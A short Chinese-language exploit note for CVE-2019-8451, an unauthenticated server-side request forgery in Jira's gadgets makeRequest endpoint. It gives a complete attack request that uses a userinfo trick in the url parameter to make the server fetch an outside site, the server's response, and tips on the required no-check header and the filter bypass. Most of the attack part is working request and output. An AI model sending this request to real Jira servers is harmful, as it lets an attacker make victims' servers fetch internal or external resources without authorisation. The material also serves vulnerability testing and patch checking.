# Jira未授权SSRF漏洞(CVE-2019-8451) 
**请求**
```
GET /plugins/servlet/gadgets/makeRequest?url=http://34.xxx.xxx.135:9090@www.baidu.com HTTP/1.1
Host: 34.xxx.xxx.135:9090
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: atlassian.xsrf.token=BLK9-HZ8Q-DNV4-7BNM|3b3e4362eb4f9ff72dd239df8f66fcb6984cc995|lout; JSESSIONID=1BCD9172AD4BD6916970E134F6CE68C9
Upgrade-Insecure-Requests: 1
X-Atlassian-Token: no-check
Pragma: no-cache
Cache-Control: no-cache


```

**响应**

```
HTTP/1.1 200 
X-AREQUESTID: 580x26659x1
X-ASESSIONID: f5m6h0
X-ASEN: SEN-L10048033
X-AUSERNAME: anonymous
X-Content-Type-Options: nosniff
Expires: Tue, 08 Oct 2019 09:40:18 GMT
Pragma: no-cache
Cache-Control: no-cache
Content-Disposition: attachment;filename=p.txt
Vary: User-Agent
Content-Type: application/json;charset=UTF-8
Content-Length: 2614
Date: Tue, 08 Oct 2019 09:40:18 GMT
Connection: close

throw 1; < don't be evil' >{"http://34.xxx.xxx.135:9090@www.baidu.com":{"rc":200,"headers":{"set-cookie":["BDORZ=27315; max-age=86400; domain=.baidu.com; path=/"]},"body":"<!DOCTYPE html>\r\n<!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8><meta http-equiv=X-UA-Compatible content=IE=Edge><meta content=always name=referrer><link rel=stylesheet type=text/css href=http://s1.bdstatic.com/r/www/cache/bdorz/baidu.min.css><title>ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é<\/title><\/head> <body link=#0000cc> <div id=wrapper> <div id=head> <div class=head_wrapper> <div class=s_form> <div class=s_form_wrapper> <div id=lg> <img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129> <\/div> <form id=form name=f action=//www.baidu.com/s class=fm> <input type=hidden name=bdorz_come value=1> <input type=hidden name=ie value=utf-8> <input type=hidden name=f value=8> <input type=hidden name=rsv_bp value=1> <input type=hidden name=rsv_idx value=1> <input type=hidden name=tn value=baidu><span class=\"bg s_ipt_wr\"><input id=kw name=wd class=s_ipt value maxlength=255 autocomplete=off autofocus><\/span><span class=\"bg s_btn_wr\"><input type=submit id=su value=ç¾åº¦ä¸ä¸ class=\"bg s_btn\"><\/span> <\/form> <\/div> <\/div> <div id=u1> <a href=http://news.baidu.com name=tj_trnews class=mnav>æ°é»<\/a> <a href=http://www.hao123.com name=tj_trhao123 class=mnav>hao123<\/a> <a href=http://map.baidu.com name=tj_trmap class=mnav>å°å¾<\/a> <a href=http://v.baidu.com name=tj_trvideo class=mnav>è§é¢<\/a> <a href=http://tieba.baidu.com name=tj_trtieba class=mnav>è´´å§<\/a> <noscript> <a href=http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name=tj_login class=lb>ç»å½<\/a> <\/noscript> <script>document.write('<a href=\"http://www.baidu.com/bdorz/login.gif?login&tpl=mn&u='+ encodeURIComponent(window.location.href+ (window.location.search === \"\" ? \"?\" : \"&\")+ \"bdorz_come=1\")+ '\" name=\"tj_login\" class=\"lb\">ç»å½<\/a>');<\/script> <a href=//www.baidu.com/more/ name=tj_briicon class=bri style=\"display: block;\">æ´å¤äº§å<\/a> <\/div> <\/div> <\/div> <div id=ftCon> <div id=ftConw> <p id=lh> <a href=http://home.baidu.com>å³äºç¾åº¦<\/a> <a href=http://ir.baidu.com>About Baidu<\/a> <\/p> <p id=cp>&copy;2017&nbsp;Baidu&nbsp;<a href=http://www.baidu.com/duty/>ä½¿ç¨ç¾åº¦åå¿è¯»<\/a>&nbsp; <a href=http://jianyi.baidu.com/ class=cp-feedback>æè§åé¦<\/a>&nbsp;äº¬ICPè¯030173å·&nbsp; <img src=//www.baidu.com/img/gs.gif> <\/p> <\/div> <\/div> <\/div> <\/body> <\/html>\r\n"}}
```

![](assets/burp.png)


随便在网上找了个现成的例子，看看就好

#### 几个比较关键的点

- 请求头`X-Atlassian-Token: no-check`必不可少，少了会直接返回404页面
- 参数url需要绕过后端检查，把目标主机端口，放在url中的用户名密码位置，以实现绕过